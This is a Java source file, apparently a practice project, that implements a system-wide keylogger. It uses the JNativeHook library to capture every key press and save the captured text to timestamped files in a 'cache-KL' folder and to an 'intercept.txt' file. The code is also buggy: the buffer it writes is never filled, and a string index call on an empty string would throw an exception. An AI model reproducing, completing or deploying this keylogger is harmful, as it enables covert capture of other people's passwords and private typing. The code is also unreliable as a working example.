package testes;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class NovoClass1 implements NativeKeyListener {

    private static final String filePath = "C:\\Users\\USER\\Downloads\\intercept.txt";

    private static String getConteudo() {
        StringBuilder conteudoExistente = new StringBuilder();
        String linhaAtual;
        BufferedReader br;
        try {
            br = new BufferedReader(new FileReader(filePath));
            while ((linhaAtual = br.readLine()) != null) {
                conteudoExistente.append(linhaAtual);
                JOptionPane.showMessageDialog(null, "Criado com Sucesso!");
            }

            return conteudoExistente.toString();
        } catch (FileNotFoundException e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
            e.printStackTrace();
        } catch (IOException e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
            e.printStackTrace();
        }
        return null;

    }

    public static void escreverTexto(String texto) {
        try {
            File file = new File(filePath);
            String conteudoAntigo = "";
            if (file.exists()) {
                conteudoAntigo = getConteudo();
                JOptionPane.showMessageDialog(null, "Conteudo já existe!");
            } else {
                file.createNewFile();
                JOptionPane.showMessageDialog(null, "Criando novo arquivo!");
            }

            Date data = new Date();
            FileWriter filewt = new FileWriter(file);
            BufferedWriter bw = new BufferedWriter(filewt);
            String textoComData = data.toString() + " escreveu: " + texto;
            bw.write(conteudoAntigo + "\n");
            bw.write(textoComData);
            bw.close();
        } catch (IOException e) {
            JOptionPane.showMessageDialog(null, e.getMessage());
            e.printStackTrace();
        }

    }
    private StringBuilder str = new StringBuilder();
    String dados = "";
    
    public void nativeKeyPressed(NativeKeyEvent e) {

        //colocandoTxt(filePath);
        if (Character.isWhitespace(e.getKeyChar())) {
            colocandoTxt(e.toString());
            str.delete(0, str.length());
            dados.charAt(e.getKeyChar());
        } else {
            str.append(e.getKeyChar());
        }

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
               JOptionPane.showMessageDialog(null, ex.getMessage());
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }
    
    void colocandoTxt(String String) {
        File dir = new File("..\\cache-KL");
        boolean bol = dir.mkdirs();
        Date data = new Date();
        SimpleDateFormat formatas = new SimpleDateFormat("dd-MM-yyyy HH+mm+ss");
        String daa = formatas.format(data);
        File arquivo = new File(dir + "\\" + daa + ".txt");
        try (FileWriter fw = new FileWriter(arquivo)) {
            fw.write(dados);
            fw.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        //Construct the example object and initialze native hook.
        GlobalScreen.addNativeKeyListener(new NovoClass1());
    }
}
